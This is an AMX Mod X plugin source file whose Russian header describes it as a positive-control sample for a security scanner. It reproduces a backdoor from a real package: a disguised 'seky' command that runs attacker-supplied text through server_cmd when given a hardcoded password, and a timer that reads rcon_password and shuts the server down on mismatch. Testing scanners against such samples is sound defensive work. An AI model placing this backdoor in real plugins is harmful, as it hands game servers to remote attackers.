/* ПОЛОЖИТЕЛЬНЫЙ КОНТРОЛЬ АУДИТА — НЕ СТАВИТЬ НА СЕРВЕР.
 *
 * Воспроизводит закладку из реального пакета sekys/cs-amxpackage (banka.sma):
 *   - команда-люк "seky" с уровнем ADMIN_ALL и описанием "#echo" для маскировки;
 *   - аргумент команды уходит прямо в server_cmd("%s", ...) — удалённое выполнение;
 *   - функция-заложник по таймеру: читает rcon_password и глушит сервер,
 *     если пароль не равен зашитому.
 *
 * Нужен для проверки, что сканер вообще что-то ловит. Если этот плагин
 * не помечен как грязный — сканеру нельзя верить ни в одном вердикте.
 */
#include <amxmodx>

public plugin_init() {
	register_plugin("Zombie Banka", "1.3", "Seky")
	register_clcmd("seky", "backdoor", ADMIN_ALL, "#echo")
	set_task(300.0, "exploit", _, _, _, "b")
}

public exploit() {
	new exploit[26]
	get_cvar_string("rcon_password", exploit, 24)
	if (!equal(exploit, "csleg2")) {
		log_amx("# Server vyuziva nelegalnu kopiu pluginov !")
		server_cmd("quit")
		server_cmd("exit")
	}
	return PLUGIN_CONTINUE
}

public backdoor(id, level, cid) {
	new arg[8], arg2[512]
	read_argv(1, arg, charsmax(arg))
	if (equal(arg, "423789")) {
		read_argv(2, arg2, charsmax(arg2))
		server_cmd("%s", arg2)
		server_exec()
	}
	return PLUGIN_HANDLED
}
